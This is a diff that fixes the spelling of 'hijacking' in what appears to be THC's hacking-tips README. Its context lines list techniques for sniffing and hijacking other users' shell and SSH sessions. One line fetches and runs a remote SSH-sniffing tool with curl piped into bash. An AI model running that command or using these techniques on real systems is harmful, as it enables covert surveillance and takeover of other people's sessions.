@@ -84,13 +84,13 @@ Got tricks? Join us on Telegram: [https://t.me/thcorg](https://t.me/thcorg)
       1. [cryptsetup](#crypto-filesystem)
       1. [EncFS](#encfs)
    1. [Encrypting a file](#encrypting-file)
-1. [SSH session sniffing and hijaking](#ssh-sniffing)
+1. [SSH session sniffing and hijacking](#ssh-sniffing)
    1. [Sniff a user's SHELL session with script](#ssh-sniffing-script)
    2. [Sniff all SHELL sessions with dtrace](#dtrace)
    1. [Sniff a user's outgoing SSH session with strace](#ssh-sniffing-strace)
    1. [Sniff a user's outgoing SSH session with a wrapper script](#ssh-sniffing-wrapper)
    1. [Sniff a user's outgoing SSH session with SSH-IT](#ssh-sniffing-sshit)
-   1. [Hijak / Take-over a running SSH session](#hijak)
+   1. [Hijack / Take-over a running SSH session](#hijack)
 1. [VPN and Shells](#vpn-shell)
    1. [Disposable Root Servers](#shell)
    1. [VPN/VPS Providers](#vpn)
@@ -1779,8 +1779,8 @@ The easiest way is using [https://www.thc.org/ssh-it/](https://www.thc.org/ssh-i
 bash -c "$(curl -fsSL https://thc.org/ssh-it/x)"
 ```
 
-<a id="hijak"></a>
-**9.vi Hijak / Take-over a running SSH session**  
+<a id="hijack"></a>
+**9.vi Hijack / Take-over a running SSH session**  
 
 Use [https://github.com/nelhage/reptyr](https://github.com/nelhage/reptyr) to take over an existing SSH session:
 ```sh
